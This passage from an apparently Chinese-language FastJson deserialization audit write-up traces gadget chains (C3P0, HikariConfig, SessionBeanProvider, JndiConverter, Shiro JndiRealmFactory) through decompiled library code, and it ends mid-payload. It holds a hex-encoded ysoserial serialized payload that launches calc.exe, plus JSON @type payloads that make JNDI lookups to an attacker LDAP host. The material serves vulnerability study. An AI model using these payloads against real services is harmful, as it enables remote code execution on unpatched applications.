2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000863616C632E65786508003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001D79736F73657269616C2F50776E6572333734323337373836333635333501001F4C79736F73657269616C2F50776E657233373432333737383633363533353B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E0018000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B02000078700000000178;&quot;</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>WrapperConnectionPoolDataSource.class用的父类的settercom.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747379201927-3258d4d1-9c3a-4f3d-a8dd-58ed8dedadef.png"></p><p>步入，跳到<code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#setUpPropertyListeners</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747379510141-e821412f-f320-4af7-bcd9-e15ca9e73b30.png"></p><p>调用<code>com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">parseUserOverridesAsString</span><span class="hljs-params">(String var0)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-keyword">if</span> (var0 != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> var0.substring(<span class="hljs-string">&quot;HexAsciiSerializedMap&quot;</span>.length() + <span class="hljs-number">1</span>, var0.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">byte</span>[] var2 = ByteUtils.fromHexAscii(var1);<br>        <span class="hljs-keyword">return</span> Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(var2));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> Collections.EMPTY_MAP;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先<code>substring</code>截取16进制数据</p><p>然后<code>return</code>调用<code>com.mchange.v2.ser.SerializableUtils#fromByteArray(byte[])</code>进行反序列化</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747379870389-2bb709ae-f268-4e81-85dd-f6a032ce69e8.png"></p><p>最后<code>return var1.readObject();</code>调用java原生的<code>java.io.ObjectInputStream</code>的反序列化方法，将输入字节数据反序列化</p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">setUserOverridesAsString -&gt; setUpPropertyListeners -&gt; parseUserOverridesAsString -&gt; fromByteArray -&gt; readObject()<br></code></pre></td></tr></table></figure><h1 id="FastJson-1-2-48"><a href="#FastJson-1-2-48" class="headerlink" title="FastJson 1.2.48"></a>FastJson 1.2.48</h1><p><code>MiscCodec.java</code>对<code>cache</code>缓存设置成<code>false</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746538413548-5673e068-6f13-4656-b28b-627f6cb09def.png"></p><p><code>checkAutoType()</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746538451144-9bd5d8a2-de22-4375-92c2-24fa08e26b47.png"></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746538271002-3866109b-3cd0-42f2-8071-edaebc2cdced.png"></p><p>至此之后的版本，寻找可用的gadget基本都是绕过黑名单为主，并且绕过需要特定的依赖，利用范围比较小。</p><h1 id="FastJson-≤-1-2-59-开启autotype"><a href="#FastJson-≤-1-2-59-开启autotype" class="headerlink" title="FastJson ≤ 1.2.59 开启autotype"></a>FastJson ≤ 1.2.59 开启autotype</h1><h2 id="com-zaxxer-hikari-HikariConfig-需要-HikariCP依赖"><a href="#com-zaxxer-hikari-HikariConfig-需要-HikariCP依赖" class="headerlink" title="com.zaxxer.hikari.HikariConfig 需要 HikariCP依赖"></a>com.zaxxer.hikari.HikariConfig 需要 HikariCP依赖</h2><p>pom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.59</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br>&lt;!-- HikariCP 连接池（含 HikariConfig 类） --&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;com.zaxxer&lt;/groupId&gt;<br>    &lt;artifactId&gt;HikariCP&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.3</span>&lt;/version&gt;  &lt;!--测试&lt;=<span class="hljs-number">4.0</span><span class="hljs-number">.3</span> 可用 --&gt;<br>&lt;/dependency&gt;<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<br>    <span class="hljs-string">&quot;metricRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>com.zaxxer.hikari.HikariConfig#setMetricRegistry</code>的<code>metricRegistry = this.getObjectOrPerformJndiLookup(metricRegistry);</code>调用了<code>getObjectOrPerformJndiLookup</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMetricRegistry</span><span class="hljs-params">(Object metricRegistry)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.metricsTrackerFactory != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;cannot use setMetricRegistry() and setMetricsTrackerFactory() together&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (metricRegistry != <span class="hljs-literal">null</span>) &#123;<br>            metricRegistry = <span class="hljs-built_in">this</span>.getObjectOrPerformJndiLookup(metricRegistry);<br>            <span class="hljs-keyword">if</span> (!UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="hljs-string">&quot;com.codahale.metrics.MetricRegistry&quot;</span>) &amp;&amp; !UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="hljs-string">&quot;io.micrometer.core.instrument.MeterRegistry&quot;</span>)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Class must be instance of com.codahale.metrics.MetricRegistry or io.micrometer.core.instrument.MeterRegistry&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.metricRegistry = metricRegistry;<br><br></code></pre></td></tr></table></figure><p><code>com.zaxxer.hikari.HikariConfig#getObjectOrPerformJndiLookup</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getObjectOrPerformJndiLookup</span><span class="hljs-params">(Object object)</span> &#123;<br>    <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> String) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initCtx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            <span class="hljs-keyword">return</span> initCtx.lookup((String)object);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(var3);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span> -&gt; setMetricRegistry -&gt; getObjectOrPerformJndiLookup -&gt; lookup<br></code></pre></td></tr></table></figure><p>利用另一个<code>setter</code>的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<br>    <span class="hljs-string">&quot;healthCheckRegistry&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>com.zaxxer.hikari.HikariConfig#setHealthCheckRegistry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHealthCheckRegistry</span><span class="hljs-params">(Object healthCheckRegistry)</span> &#123;<br>    <span class="hljs-built_in">this</span>.checkIfSealed();<br>    <span class="hljs-keyword">if</span> (healthCheckRegistry != <span class="hljs-literal">null</span>) &#123;<br>        healthCheckRegistry = <span class="hljs-built_in">this</span>.getObjectOrPerformJndiLookup(healthCheckRegistry);<br>        <span class="hljs-keyword">if</span> (!(healthCheckRegistry <span class="hljs-keyword">instanceof</span> HealthCheckRegistry)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Class must be an instance of com.codahale.metrics.health.HealthCheckRegistry&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.healthCheckRegistry = healthCheckRegistry;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样调用了<code>com.zaxxer.hikari.HikariConfig#getObjectOrPerformJndiLookup</code></p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span> -&gt; setHealthCheckRegistry -&gt; getObjectOrPerformJndiLookup -&gt; lookup<br></code></pre></td></tr></table></figure><h1 id="FastJson-≤-1-2-61-开启autotype"><a href="#FastJson-≤-1-2-61-开启autotype" class="headerlink" title="FastJson ≤ 1.2.61 开启autotype"></a>FastJson ≤ 1.2.61 开启autotype</h1><h2 id="SessionBeanProvider-网传未复现成功"><a href="#SessionBeanProvider-网传未复现成功" class="headerlink" title="SessionBeanProvider 网传未复现成功"></a>SessionBeanProvider 网传未复现成功</h2><p>pom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.61</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br>&lt;!-- Apache Commons Proxy（提供 SessionBeanProvider 类） --&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-proxy&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span>&lt;/version&gt;  &lt;!-- 包含 SessionBeanProvider --&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<br>    <span class="hljs-string">&quot;jndiName&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;Object&quot;</span>: <span class="hljs-string">&quot;a&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>报错是被<code>checkAutoType</code>黑名单拦截了</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747056747501-835df715-fa0b-4ee3-8e63-9c1e47915e11.png"></p><p><code>D:\maven_repo\org\apache\commons\commons-proxy\1.0\commons-proxy-1.0.jar!\org\apache\commons\proxy\provider\remoting\SessionBeanProvider.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> org.apache.commons.proxy.provider.remoting;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.rmi.PortableRemoteObject;<br><span class="hljs-keyword">import</span> org.apache.commons.proxy.ObjectProvider;<br><span class="hljs-keyword">import</span> org.apache.commons.proxy.ProxyUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.proxy.exception.ObjectProviderException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionBeanProvider</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectProvider</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String jndiName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class homeInterface;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Properties properties;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SessionBeanProvider</span><span class="hljs-params">(String jndiName, Class homeInterface)</span> &#123;<br>        <span class="hljs-built_in">this</span>.jndiName = jndiName;<br>        <span class="hljs-built_in">this</span>.homeInterface = homeInterface;<br>        <span class="hljs-built_in">this</span>.properties = <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SessionBeanProvider</span><span class="hljs-params">(String jndiName, Class homeInterface, Properties properties)</span> &#123;<br>        <span class="hljs-built_in">this</span>.jndiName = jndiName;<br>        <span class="hljs-built_in">this</span>.homeInterface = homeInterface;<br>        <span class="hljs-built_in">this</span>.properties = properties;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.properties == <span class="hljs-literal">null</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>() : <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(<span class="hljs-built_in">this</span>.properties);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">homeObject</span> <span class="hljs-operator">=</span> PortableRemoteObject.narrow(initialContext.lookup(<span class="hljs-built_in">this</span>.jndiName), <span class="hljs-built_in">this</span>.homeInterface);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">createMethod</span> <span class="hljs-operator">=</span> homeObject.getClass().getMethod(<span class="hljs-string">&quot;create&quot;</span>, ProxyUtils.EMPTY_ARGUMENT_TYPES);<br>            <span class="hljs-keyword">return</span> createMethod.invoke(homeObject, ProxyUtils.EMPTY_ARGUMENTS);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var4) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectProviderException</span>(<span class="hljs-string">&quot;Unable to find no-arg create() method on home interface &quot;</span> + <span class="hljs-built_in">this</span>.homeInterface.getName() + <span class="hljs-string">&quot;.&quot;</span>, var4);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectProviderException</span>(<span class="hljs-string">&quot;No-arg create() method on home interface &quot;</span> + <span class="hljs-built_in">this</span>.homeInterface.getName() + <span class="hljs-string">&quot; is not accessible.&quot;</span>, var5);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectProviderException</span>(<span class="hljs-string">&quot;Unable to lookup EJB home object in JNDI.&quot;</span>, var6);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var7) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectProviderException</span>(<span class="hljs-string">&quot;No-arg create() method on home interface &quot;</span> + <span class="hljs-built_in">this</span>.homeInterface.getName() + <span class="hljs-string">&quot; threw an exception.&quot;</span>, var7);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="FastJson-≤1-2-62-开启autotype"><a href="#FastJson-≤1-2-62-开启autotype" class="headerlink" title="FastJson ≤1.2.62 开启autotype"></a>FastJson ≤1.2.62 开启<code>autotype</code></h1><h2 id="JndiConverter-需要xbean-reflect依赖"><a href="#JndiConverter-需要xbean-reflect依赖" class="headerlink" title="JndiConverter 需要xbean-reflect依赖"></a>JndiConverter 需要xbean-reflect依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;<br>            &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">4.27</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br><span class="hljs-comment">//目前最新版本4.27可以利用</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<br>  <span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>需要开启<code>autotype</code></p><p><code>org.apache.xbean.propertyeditor.JndiConverter</code></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-keyword">package</span> org.apache.xbean.propertyeditor;<br><br><span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">Context</span>;<br><span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">InitialContext</span>;<br><span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">NamingException</span>;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JndiConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractConverter</span> </span>&#123;<br>    public <span class="hljs-type">JndiConverter</span>() &#123;<br>        <span class="hljs-keyword">super</span>(<span class="hljs-type">Context</span>.<span class="hljs-keyword">class</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">Object</span> toObjectImpl(<span class="hljs-type">String</span> text) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> context = <span class="hljs-keyword">new</span> <span class="hljs-type">InitialContext</span>();<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">Context</span>)context.lookup(text);<br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-type">NamingException</span> var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">PropertyEditorException</span>(var3);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里有一个<code>lookup查询</code>参数是<code>text</code></p><p>这里构造方法用的是父类的<code>org.apache.xbean.propertyeditor.AbstractConverter</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746592498325-1a9c5eae-0604-4ac6-99ad-0e0743d5f5d7.png"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">setAsText()`调用了`toObject`然后调用`toObjectImpl<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746621933306-e12a2c89-74f9-4aaf-8eaf-5a0231bbe342.png"></p><p>gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@type(JndiConverter)</span>-&gt; JndiConverter#JndiConverter -&gt; AbstractConverter#setAsText -&gt; AbstractConverter#toObject -&gt; JndiConverter#toObjectImpl#lookup()<br></code></pre></td></tr></table></figure><p>看<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson">https://mvnrepository.com/artifact/com.alibaba/fastjson</a></p><p>下一个版本是<code>1.2.63_noneautotype</code>不支持<code>autotype</code>自然无法利用</p><p>再下一个版本<code>1.2.66</code>黑名单加了<code>JndiConverter</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746592837880-0db1e87c-49d7-4565-a45f-e62c8ddaefb0.png"></p><h1 id="FastJson-≤1-2-66-开启AutoType"><a href="#FastJson-≤1-2-66-开启AutoType" class="headerlink" title="FastJson ≤1.2.66 开启AutoType"></a>FastJson ≤1.2.66 开启AutoType</h1><p>gadget很多，<code>jndi</code>注入需要<code>JDK</code>版本支持</p><h2 id="JndiRealmFactory-shiro-core依赖"><a href="#JndiRealmFactory-shiro-core依赖" class="headerlink" title="JndiRealmFactory  shiro-core依赖"></a>JndiRealmFactory  shiro-core依赖</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//shiro-core 1.x.x版本可以利用</span><br>        &lt;dependency&gt;<br>            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;<br>            &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">1.13</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>,<br>    <span 